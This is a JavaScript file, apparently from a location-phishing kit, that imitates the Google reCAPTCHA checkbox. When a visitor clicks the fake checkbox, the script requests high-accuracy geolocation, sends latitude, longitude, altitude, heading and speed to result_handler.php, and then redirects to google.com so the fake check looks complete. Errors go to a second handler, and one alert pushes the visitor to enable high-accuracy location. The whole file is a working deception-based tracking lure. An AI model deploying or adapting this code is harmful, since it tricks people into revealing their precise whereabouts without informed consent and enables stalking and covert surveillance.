function loading(){
  document.getElementById('recaptcha-anchor').outerHTML='<span role="checkbox" aria-checked="true" id="recaptcha-anchor" dir="ltr" aria-labelledby="recaptcha-anchor-label" aria-disabled="false" tabindex="0" style="" class="recaptcha-checkbox goog-inline-block recaptcha-checkbox-unchecked rc-anchor-checkbox recaptcha-checkbox-loading"><div class="recaptcha-checkbox-border" role="presentation" style="display: none;"></div><div class="recaptcha-checkbox-borderAnimation" role="presentation" style=""></div><div class="recaptcha-checkbox-spinner" role="presentation" style="display: ; animation-play-state: running; opacity: 1;"><div class="recaptcha-checkbox-spinner-overlay" style="animation-play-state: running;"></div></div><div class="recaptcha-checkbox-checkmark" role="presentation" style=""></div></span>';
}
function cap_success(){
  document.getElementById('recaptcha-anchor').outerHTML='<span class="recaptcha-checkbox goog-inline-block recaptcha-checkbox-unchecked rc-anchor-checkbox recaptcha-checkbox-checked" role="checkbox" aria-checked="true" id="recaptcha-anchor" dir="ltr" aria-labelledby="recaptcha-anchor-label" aria-disabled="false" tabindex="0" style="overflow: visible;"><div class="recaptcha-checkbox-border" role="presentation" style="display: none;"></div><div class="recaptcha-checkbox-borderAnimation" role="presentation" style=""></div><div class="recaptcha-checkbox-spinner" role="presentation" style="display: none; animation-play-state: running; opacity: 1;"><div class="recaptcha-checkbox-spinner-overlay" style="animation-play-state: running;"></div></div><div class="recaptcha-checkbox-checkmark" role="presentation" style=""></div></span>';
}
function cap_uncheck(){
  document.getElementById('recaptcha-anchor').outerHTML='<span class="recaptcha-checkbox goog-inline-block recaptcha-checkbox-unchecked rc-anchor-checkbox" role="checkbox" aria-checked="false" id="recaptcha-anchor" tabindex="0" dir="ltr" aria-labelledby="recaptcha-anchor-label"><div class="recaptcha-checkbox-border" onclick="window.top.location.reload(); role="presentation"></div><div class="recaptcha-checkbox-borderAnimation" role="presentation"></div><div class="recaptcha-checkbox-spinner" role="presentation"><div class="recaptcha-checkbox-spinner-overlay"></div></div><div class="recaptcha-checkbox-checkmark" role="presentation"></div></span>';
}
function cap_error(){
  document.getElementById('recaptcha-anchor').outerHTML='<span class="recaptcha-checkbox goog-inline-block recaptcha-checkbox-unchecked rc-anchor-checkbox recaptcha-checkbox-expired" role="checkbox" aria-checked="false" id="recaptcha-anchor" tabindex="0" dir="ltr" aria-labelledby="recaptcha-anchor-label"><div class="recaptcha-checkbox-border" onclick="window.top.location.reload();" role="presentation" style=""></div><div class="recaptcha-checkbox-borderAnimation" role="presentation" style=""></div><div class="recaptcha-checkbox-spinner" role="presentation"><div class="recaptcha-checkbox-spinner-overlay"></div></div><div class="recaptcha-checkbox-checkmark" role="presentation"></div></span>'
}
function cap_forward(){
  window.top.location = 'https://www.google.com'
}

function transmit(){
  loading();
  setTimeout(locate(), 2000);
}

function transmitted(){
  cap_success();
  cap_forward();
}

function locate()
{
  
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Geolocation is not Supported by your Browser...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    if( lat ){
      lat = lat + ' deg';
    }
    else {
      lat = 'Not Available';
    }
    var lon = position.coords.longitude;
    if( lon ){
      lon = lon + ' deg';
    }
    else {
      lon = 'Not Available';
    }
    var acc = position.coords.accuracy;
    if( acc ){
      acc = acc + ' m';
    }
    else {
      acc = 'Not Available';
    }
    var alt = position.coords.altitude;
    if( alt ){
      alt = alt + ' m';
    }
    else {
      alt = 'Not Available';
    }
    var dir = position.coords.heading;
    if( dir ){
      dir = dir + ' deg';
    }
    else {
      dir = 'Not Available';
    }
    var spd = position.coords.speed;
    if( spd ){
      spd = spd + ' m/s';
    }
    else {
      spd = 'Not Available';
    }

    var ok_status = 'success';

    $.ajax({
      type: 'POST',
      url: 'result_handler.php',
      data: {Status: ok_status,Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
      success: transmitted,
      mimeType: 'text'
    });
  };

}

function showError(error)
{
  var err_text;
  var err_status = 'failed';

	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			err_text = 'User denied the request for Geolocation';
      //alert('Please Refresh This Page and Allow Location Permission...');
      break;
		case error.POSITION_UNAVAILABLE:
			err_text = 'Location information is unavailable';
			break;
		case error.TIMEOUT:
			err_text = 'The request to get user location timed out';
      alert('Please Set Your Location Mode on High Accuracy...');
			break;
		case error.UNKNOWN_ERROR:
			err_text = 'An unknown error occurred';
			break;
	}

  $.ajax({
    type: 'POST',
    url: 'error_handler.php',
    data: {Status: err_status, Error: err_text},
    success: function(){cap_error();},
    mimeType: 'text'
  });

}
